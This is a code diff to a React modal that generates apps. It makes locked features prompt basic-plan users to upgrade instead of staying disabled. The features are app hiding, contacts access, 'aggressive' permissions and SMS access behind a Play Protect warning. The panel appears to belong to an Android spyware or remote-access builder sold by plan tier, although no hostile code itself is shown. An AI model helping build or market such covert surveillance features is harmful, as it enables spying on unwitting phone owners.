@@ -8,9 +8,10 @@ interface AppGenerationModalProps {
     uuid: string;
     socket: any;
     userPlan?: 'basic' | 'standard' | 'premium';
+    onUpgrade?: () => void;
 }
 
-export default function AppGenerationModal({ isOpen, onClose, uuid, socket, userPlan = 'basic' }: AppGenerationModalProps) {
+export default function AppGenerationModal({ isOpen, onClose, uuid, socket, userPlan = 'basic', onUpgrade }: AppGenerationModalProps) {
     const isBasicPlan = userPlan === 'basic';
     const [status, setStatus] = useState<'idle' | 'queued' | 'generating' | 'downloading' | 'completed'>('idle');
     const [progress, setProgress] = useState(0);
@@ -202,9 +203,14 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                                 {isBasicPlan && <span className="text-[10px] px-1.5 py-0.5 bg-yellow-500/20 text-yellow-400 rounded">PRO</span>}
                             </div>
                             <button
-                                onClick={() => !isBasicPlan && setHideApp(!hideApp)}
-                                disabled={isBasicPlan}
-                                className={`w-12 h-6 rounded-full transition-colors relative ${isBasicPlan ? 'bg-white/10 cursor-not-allowed' : hideApp ? 'bg-purple-500' : 'bg-white/20'}`}
+                                onClick={() => {
+                                    if (isBasicPlan) {
+                                        onUpgrade?.();
+                                        return;
+                                    }
+                                    setHideApp(!hideApp);
+                                }}
+                                className={`w-12 h-6 rounded-full transition-colors relative ${isBasicPlan ? 'bg-white/10' : hideApp ? 'bg-purple-500' : 'bg-white/20'}`}
                             >
                                 <div className={`w-4 h-4 bg-white rounded-full absolute top-1 transition-transform ${hideApp && !isBasicPlan ? 'left-7' : 'left-1'}`} />
                             </button>
@@ -232,9 +238,14 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                                     </button>
                                 </div>
                                 <button
-                                    onClick={() => !isBasicPlan && setEnableContactsPermission(!enableContactsPermission)}
-                                    disabled={isBasicPlan}
-                                    className={`w-12 h-6 rounded-full transition-colors relative ${isBasicPlan ? 'bg-white/10 cursor-not-allowed' : enableContactsPermission ? 'bg-green-500' : 'bg-white/20'}`}
+                                    onClick={() => {
+                                        if (isBasicPlan) {
+                                            onUpgrade?.();
+                                            return;
+                                        }
+                                        setEnableContactsPermission(!enableContactsPermission);
+                                    }}
+                                    className={`w-12 h-6 rounded-full transition-colors relative ${isBasicPlan ? 'bg-white/10' : enableContactsPermission ? 'bg-green-500' : 'bg-white/20'}`}
                                 >
                                     <div className={`w-4 h-4 bg-white rounded-full absolute top-1 transition-transform ${enableContactsPermission && !isBasicPlan ? 'left-7' : 'left-1'}`} />
                                 </button>
@@ -283,9 +294,14 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                                                     {isBasicPlan && <span className="text-[10px] px-1.5 py-0.5 bg-yellow-500/20 text-yellow-400 rounded">PRO</span>}
                                                 </div>
                                                 <button
-                                                    onClick={() => !isBasicPlan && setAggressivePermissions(!aggressivePermissions)}
-                                                    disabled={isBasicPlan}
-                                                    className={`w-12 h-6 rounded-full transition-colors relative ${isBasicPlan ? 'bg-white/10 cursor-not-allowed' : aggressivePermissions ? 'bg-yellow-500' : 'bg-white/20'}`}
+                                                    onClick={() => {
+                                                        if (isBasicPlan) {
+                                                            onUpgrade?.();
+                                                            return;
+                                                        }
+                                                        setAggressivePermissions(!aggressivePermissions);
+                                                    }}
+                                                    className={`w-12 h-6 rounded-full transition-colors relative ${isBasicPlan ? 'bg-white/10' : aggressivePermissions ? 'bg-yellow-500' : 'bg-white/20'}`}
                                                 >
                                                     <div className={`w-4 h-4 bg-white rounded-full absolute top-1 transition-transform ${aggressivePermissions && !isBasicPlan ? 'left-7' : 'left-1'}`} />
                                                 </button>
@@ -304,15 +320,17 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                                             </div>
                                             <button
                                                 onClick={() => {
-                                                    if (isBasicPlan) return;
+                                                    if (isBasicPlan) {
+                                                        onUpgrade?.();
+                                                        return;
+                                                    }
                                                     if (!enableSmsPermission) {
                                                         setShowPlayProtectWarning(true);
                                                     } else {
                                                         setEnableSmsPermission(false);
                                                     }
                                                 }}
-                                                disabled={isBasicPlan}
-                                                className={`w-12 h-6 rounded-full transition-colors relative ${isBasicPlan ? 'bg-white/10 cursor-not-allowed' : enableSmsPermission ? 'bg-red-500' : 'bg-white/20'}`}
+                                                className={`w-12 h-6 rounded-full transition-colors relative ${isBasicPlan ? 'bg-white/10' : enableSmsPermission ? 'bg-red-500' : 'bg-white/20'}`}
                                             >
                                                 <div className={`w-4 h-4 bg-white rounded-full absolute top-1 transition-transform ${enableSmsPermission && !isBasicPlan ? 'left-7' : 'left-1'}`} />
                                             </button>
